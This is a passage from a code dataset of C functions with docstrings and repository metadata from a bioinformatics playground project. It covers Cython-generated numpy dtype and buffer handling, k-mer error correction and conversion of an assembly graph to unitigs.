__pyx_f[1]; __pyx_lineno = 819; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 819; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 819; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 73;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":820\n *             elif t == NPY_INT:         f[0] = 105 #\"i\"\n *             elif t == NPY_UINT:        f[0] =  73 #\"I\"\n *             elif t == NPY_LONG:        f[0] = 108 #\"l\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_ULONG:       f[0] = 76  #\"L\"\n *             elif t == NPY_LONGLONG:    f[0] = 113 #\"q\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_LONG); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 820; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 820; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 820; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 108;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":821\n *             elif t == NPY_UINT:        f[0] =  73 #\"I\"\n *             elif t == NPY_LONG:        f[0] = 108 #\"l\"\n *             elif t == NPY_ULONG:       f[0] = 76  #\"L\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_LONGLONG:    f[0] = 113 #\"q\"\n *             elif t == NPY_ULONGLONG:   f[0] = 81  #\"Q\"\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_ULONG); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 821; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 821; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 821; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 76;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":822\n *             elif t == NPY_LONG:        f[0] = 108 #\"l\"\n *             elif t == NPY_ULONG:       f[0] = 76  #\"L\"\n *             elif t == NPY_LONGLONG:    f[0] = 113 #\"q\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_ULONGLONG:   f[0] = 81  #\"Q\"\n *             elif t == NPY_FLOAT:       f[0] = 102 #\"f\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_LONGLONG); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 822; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 822; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 822; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 113;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":823\n *             elif t == NPY_ULONG:       f[0] = 76  #\"L\"\n *             elif t == NPY_LONGLONG:    f[0] = 113 #\"q\"\n *             elif t == NPY_ULONGLONG:   f[0] = 81  #\"Q\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_FLOAT:       f[0] = 102 #\"f\"\n *             elif t == NPY_DOUBLE:      f[0] = 100 #\"d\"\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_ULONGLONG); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 823; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 823; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 823; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 81;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":824\n *             elif t == NPY_LONGLONG:    f[0] = 113 #\"q\"\n *             elif t == NPY_ULONGLONG:   f[0] = 81  #\"Q\"\n *             elif t == NPY_FLOAT:       f[0] = 102 #\"f\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_DOUBLE:      f[0] = 100 #\"d\"\n *             elif t == NPY_LONGDOUBLE:  f[0] = 103 #\"g\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_FLOAT); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 824; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 824; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 824; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 102;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":825\n *             elif t == NPY_ULONGLONG:   f[0] = 81  #\"Q\"\n *             elif t == NPY_FLOAT:       f[0] = 102 #\"f\"\n *             elif t == NPY_DOUBLE:      f[0] = 100 #\"d\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_LONGDOUBLE:  f[0] = 103 #\"g\"\n *             elif t == NPY_CFLOAT:      f[0] = 90; f[1] = 102; f += 1 # Zf\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_DOUBLE); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 825; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 825; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 825; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 100;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":826\n *             elif t == NPY_FLOAT:       f[0] = 102 #\"f\"\n *             elif t == NPY_DOUBLE:      f[0] = 100 #\"d\"\n *             elif t == NPY_LONGDOUBLE:  f[0] = 103 #\"g\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_CFLOAT:      f[0] = 90; f[1] = 102; f += 1 # Zf\n *             elif t == NPY_CDOUBLE:     f[0] = 90; f[1] = 100; f += 1 # Zd\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_LONGDOUBLE); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 826; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 826; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 826; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 103;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":827\n *             elif t == NPY_DOUBLE:      f[0] = 100 #\"d\"\n *             elif t == NPY_LONGDOUBLE:  f[0] = 103 #\"g\"\n *             elif t == NPY_CFLOAT:      f[0] = 90; f[1] = 102; f += 1 # Zf             # <<<<<<<<<<<<<<\n *             elif t == NPY_CDOUBLE:     f[0] = 90; f[1] = 100; f += 1 # Zd\n *             elif t == NPY_CLONGDOUBLE: f[0] = 90; f[1] = 103; f += 1 # Zg\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_CFLOAT); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 827; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 827; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 827; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 90;\n        (__pyx_v_f[1]) = 102;\n        __pyx_v_f = (__pyx_v_f + 1);\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":828\n *             elif t == NPY_LONGDOUBLE:  f[0] = 103 #\"g\"\n *             elif t == NPY_CFLOAT:      f[0] = 90; f[1] = 102; f += 1 # Zf\n *             elif t == NPY_CDOUBLE:     f[0] = 90; f[1] = 100; f += 1 # Zd             # <<<<<<<<<<<<<<\n *             elif t == NPY_CLONGDOUBLE: f[0] = 90; f[1] = 103; f += 1 # Zg\n *             elif t == NPY_OBJECT:      f[0] = 79 #\"O\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_CDOUBLE); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 828; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 828; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 828; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 90;\n        (__pyx_v_f[1]) = 100;\n        __pyx_v_f = (__pyx_v_f + 1);\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":829\n *             elif t == NPY_CFLOAT:      f[0] = 90; f[1] = 102; f += 1 # Zf\n *             elif t == NPY_CDOUBLE:     f[0] = 90; f[1] = 100; f += 1 # Zd\n *             elif t == NPY_CLONGDOUBLE: f[0] = 90; f[1] = 103; f += 1 # Zg             # <<<<<<<<<<<<<<\n *             elif t == NPY_OBJECT:      f[0] = 79 #\"O\"\n *             else:\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_CLONGDOUBLE); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 829; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 829; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 829; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 90;\n        (__pyx_v_f[1]) = 103;\n        __pyx_v_f = (__pyx_v_f + 1);\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":830\n *             elif t == NPY_CDOUBLE:     f[0] = 90; f[1] = 100; f += 1 # Zd\n *             elif t == NPY_CLONGDOUBLE: f[0] = 90; f[1] = 103; f += 1 # Zg\n *             elif t == NPY_OBJECT:      f[0] = 79 #\"O\"             # <<<<<<<<<<<<<<\n *             else:\n *                 raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_OBJECT); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 830; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 830; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 830; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 79;\n        goto __pyx_L11;\n      }\n      /*else*/ {\n\n        /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":832\n *             elif t == NPY_OBJECT:      f[0] = 79 #\"O\"\n *             else:\n *                 raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)             # <<<<<<<<<<<<<<\n *             f += 1\n *         else:\n */\n        __pyx_t_5 = PyNumber_Remainder(((PyObject *)__pyx_kp_u_14), __pyx_v_t); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 832; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n        __Pyx_GOTREF(((PyObject *)__pyx_t_5));\n        __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 832; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n        __Pyx_GOTREF(((PyObject *)__pyx_t_3));\n        PyTuple_SET_ITEM(__pyx_t_3, 0, ((PyObject *)__pyx_t_5));\n        __Pyx_GIVEREF(((PyObject *)__pyx_t_5));\n        __pyx_t_5 = 0;\n        __pyx_t_5 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_t_3), NULL); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 832; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(((PyObject *)__pyx_t_3)); __pyx_t_3 = 0;\n        __Pyx_Raise(__pyx_t_5, 0, 0);\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        {__pyx_filename = __pyx_f[1]; __pyx_lineno = 832; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      }\n      __pyx_L11:;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":833\n *             else:\n *                 raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)\n *             f += 1             # <<<<<<<<<<<<<<\n *         else:\n *             # Cython ignores struct boundary information (\"T{...}\"),\n */\n      __pyx_v_f = (__pyx_v_f + 1);\n      goto __pyx_L9;\n    }\n    /*else*/ {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":837\n *             # Cython ignores struct boundary information (\"T{...}\"),\n *             # so don't output it\n *             f = _util_dtypestring(child, f, end, offset)             # <<<<<<<<<<<<<<\n *     return f\n * \n */\n      __pyx_t_11 = __pyx_f_5numpy__util_dtypestring(__pyx_v_child, __pyx_v_f, __pyx_v_end, __pyx_v_offset); if (unlikely(__pyx_t_11 == NULL)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 837; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __pyx_v_f = __pyx_t_11;\n    }\n    __pyx_L9:;\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":838\n *             # so don't output it\n *             f = _util_dtypestring(child, f, end, offset)\n *     return f             # <<<<<<<<<<<<<<\n * \n * \n */\n  __pyx_r = __pyx_v_f;\n  goto __pyx_L0;\n\n  __pyx_r = 0;\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_AddTraceback(\"numpy._util_dtypestring\");\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_DECREF((PyObject *)__pyx_v_child);\n  __Pyx_DECREF(__pyx_v_fields);\n  __Pyx_DECREF(__pyx_v_childname);\n  __Pyx_DECREF(__pyx_v_new_offset);\n  __Pyx_DECREF(__pyx_v_t);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/***************************\n * Independent ec routines *\n ***************************/\n", "func_signal": "int bfc_ec_greedy_k(int k, int mode, const bfc_kmer_t *x, const bfc_ch_t *ch)", "code": "{\n\tint i, j, max = 0, max_ec = -1, max2 = 0;\n\tfor (i = 0; i < k; ++i) {\n\t\tint c = (x->x[1]>>i&1)<<1 | (x->x[0]>>i&1);\n\t\tfor (j = 0; j < 4; ++j) {\n\t\t\tbfc_kmer_t y = *x;\n\t\t\tint ret;\n\t\t\tif (j == c) continue;\n\t\t\tbfc_kmer_change(k, y.x, i, j);\n\t\t\tret = bfc_ch_kmer_occ(ch, &y);\n\t\t\tif (ret < 0) continue;\n\t\t\tif ((max&0xff) < (ret&0xff)) max2 = max, max = ret, max_ec = i<<2 | j;\n\t\t\telse if ((max2&0xff) < (ret&0xff)) max2 = ret;\n\t\t}\n\t}\n\treturn (max&0xff) * 3 > mode && (max2&0xff) < 3? max_ec : -1;\n}", "path": "nim-stuffs\\fermil-nim\\bfc.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "// from mag.c\n", "func_signal": "fml_utg_t *fml_mag2utg(struct mag_t *g, int *n)", "code": "{\n\tsize_t i, j;\n\tfml_utg_t *utg;\n\tkhash_t(64) *h;\n\tkhint_t k;\n\n\th = kh_init(64);\n\tfor (i = j = 0; i < g->v.n; ++i) {\n\t\tint absent;\n\t\tmagv_t *p = &g->v.a[i];\n\t\tif (p->len < 0) continue;\n\t\tk = kh_put(64, h, p->k[0], &absent);\n\t\tkh_val(h, k) = j<<1 | 0;\n\t\tk = kh_put(64, h, p->k[1], &absent);\n\t\tkh_val(h, k) = j<<1 | 1;\n\t\t++j;\n\t}\n\t*n = j;\n\tkh_destroy(64, g->h);\n\n\tutg = (fml_utg_t*)calloc(*n, sizeof(fml_utg_t));\n\tfor (i = j = 0; i < g->v.n; ++i) {\n\t\tmagv_t *p = &g->v.a[i];\n\t\tfml_utg_t *q;\n\t\tint from, a, b;\n\t\tif (p->len < 0) continue;\n\t\tq = &utg[j++];\n\t\tq->len = p->len, q->nsr = p->nsr;\n\t\tq->seq = p->seq, q->cov = p->cov;\n\t\tfor (a = 0; a < q->len; ++a)\n\t\t\tq->seq[a] = \"$ACGTN\"[(int)q->seq[a]];\n\t\tq->seq[q->len] = q->cov[q->len] = 0;\n\t\tfor (from = 0; from < 2; ++from) {\n\t\t\tku128_v *r = &p->nei[from];\n\t\t\tfor (b = q->n_ovlp[from] = 0; b < r->n; ++b)\n\t\t\t\tif (!edge_is_del(r->a[b])) ++q->n_ovlp[from];\n\t\t}\n\t\tq->ovlp = (fml_ovlp_t*)calloc(q->n_ovlp[0] + q->n_ovlp[1], sizeof(fml_ovlp_t));\n\t\tfor (from = a = 0; from < 2; ++from) {\n\t\t\tku128_v *r = &p->nei[from];\n\t\t\tfor (b = 0; b < r->n; ++b) {\n\t\t\t\tku128_t *s = &r->a[b];\n\t\t\t\tfml_ovlp_t *t;\n\t\t\t\tif (edge_is_del(*s)) continue;\n\t\t\t\tt = &q->ovlp[a++];\n\t\t\t\tk = kh_get(64, h, s->x);\n\t\t\t\tassert(k != kh_end(h));\n\t\t\t\tt->id = kh_val(h, k) >> 1;\n\t\t\t\tt->to = kh_val(h, k) & 1;\n\t\t\t\tt->len = s->y;\n\t\t\t\tt->from = from;\n\t\t\t}\n\t\t\tfree(p->nei[from].a);\n\t\t}\n\t}\n\tkh_destroy(64, h);\n\tfree(g->v.a);\n\tfree(g);\n\treturn utg;\n}", "path": "nim-stuffs\\fermil-nim\\misc.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/*proto*/\n", "func_signal": "static CYTHON_UNUSED void __pyx_pf_5numpy_7ndarray_1__releasebuffer__(PyObject *__pyx_v_self, Py_buffer *__pyx_v_info)", "code": "{\n  int __pyx_t_1;\n  __Pyx_RefNannySetupContext(\"__releasebuffer__\");\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":280\n * \n *         def __releasebuffer__(ndarray self, Py_buffer* info):\n *             if PyArray_HASFIELDS(self):             # <<<<<<<<<<<<<<\n *                 stdlib.free(info.format)\n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):\n */\n  __pyx_t_1 = PyArray_HASFIELDS(((PyArrayObject *)__pyx_v_self));\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":281\n *         def __releasebuffer__(ndarray self, Py_buffer* info):\n *             if PyArray_HASFIELDS(self):\n *                 stdlib.free(info.format)             # <<<<<<<<<<<<<<\n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):\n *                 stdlib.free(info.strides)\n */\n    free(__pyx_v_info->format);\n    goto __pyx_L5;\n  }\n  __pyx_L5:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":282\n *             if PyArray_HASFIELDS(self):\n *                 stdlib.free(info.format)\n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):             # <<<<<<<<<<<<<<\n *                 stdlib.free(info.strides)\n *                 # info.shape was stored after info.strides in the same block\n */\n  __pyx_t_1 = ((sizeof(npy_intp)) != (sizeof(Py_ssize_t)));\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":283\n *                 stdlib.free(info.format)\n *             if sizeof(npy_intp) != sizeof(Py_ssize_t):\n *                 stdlib.free(info.strides)             # <<<<<<<<<<<<<<\n *                 # info.shape was stored after info.strides in the same block\n * \n */\n    free(__pyx_v_info->strides);\n    goto __pyx_L6;\n  }\n  __pyx_L6:;\n\n  __Pyx_RefNannyFinishContext();\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":953\n * \n * \n * cdef inline void set_array_base(ndarray arr, object base):             # <<<<<<<<<<<<<<\n *      cdef PyObject* baseptr\n *      if base is None:\n */\n", "func_signal": "static CYTHON_INLINE void __pyx_f_5numpy_set_array_base(PyArrayObject *__pyx_v_arr, PyObject *__pyx_v_base)", "code": "{\n  PyObject *__pyx_v_baseptr;\n  int __pyx_t_1;\n  __Pyx_RefNannySetupContext(\"set_array_base\");\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":955\n * cdef inline void set_array_base(ndarray arr, object base):\n *      cdef PyObject* baseptr\n *      if base is None:             # <<<<<<<<<<<<<<\n *          baseptr = NULL\n *      else:\n */\n  __pyx_t_1 = (__pyx_v_base == 